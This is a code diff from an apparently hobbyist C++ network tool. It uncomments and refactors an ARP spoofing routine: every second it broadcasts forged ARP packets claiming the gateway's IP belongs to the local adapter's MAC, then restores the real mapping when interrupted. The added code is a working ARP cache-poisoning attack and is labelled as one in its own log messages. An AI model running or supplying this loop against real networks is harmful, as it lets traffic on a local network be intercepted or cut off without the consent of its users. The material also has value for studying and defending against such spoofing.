@@ -41,23 +41,25 @@ int main(int argc, char** argv)
 
     } else {
         signal(SIGINT, onInterrupt);
-        // mac gateway_mac;
-        // if (transport::ip2mac(handle, apt.gateway, gateway_mac)) {
-        //     LOG(INFO) << "gateway {} is at {}"_format(apt.gateway.to_str(),
-        //     gateway_mac.to_str());
-        // }
-        // LOG(INFO) << "forging gateway's mac to {}..."_format(apt.mac_.to_str());
-        // auto lie = packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true);
-        // while (!end_attack) {
-        //     transport::send(handle, lie);
-        //     std::this_thread::sleep_for(1000ms);
-        // }
-        // LOG(INFO) << "attack stopped";
-        // if (transport::ip2mac(handle, apt.gateway, gateway_mac, false)) {
-        //     auto truth = packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true);
-        //     transport::send(handle, truth);
-        //     LOG(INFO) << "gateway's mac restored to {}"_format(gateway_mac.to_str());
-        // }
+        auto& apt = driver.getAdaptor();
+        if (auto gateway_mac = driver.getMac(apt.gateway)) {
+            ILOG("gateway {} is at {}", apt.gateway.toStr(), gateway_mac->toStr());
+        } else {
+            ELOG(gateway_mac.error().what());
+            return 1;
+        }
+        ILOG("pretending gateway's mac to {}...", apt.mac.toStr());
+        auto lie = driver.broadcastedARP(apt.mac, apt.gateway, apt.mac, apt.ip, true);
+        while (!end_attack) {
+            driver.send(lie);
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }
+        ILOG("attack stopped");
+        if (auto gateway_mac = driver.getMac(apt.gateway)) {
+            auto truth = driver.broadcastedARP(*gateway_mac, apt.gateway, apt.mac, apt.ip, true);
+            driver.send(truth);
+            ILOG("gateway's mac restored to {}", gateway_mac->toStr());
+        }
     }
     MY_CATCH;
 }
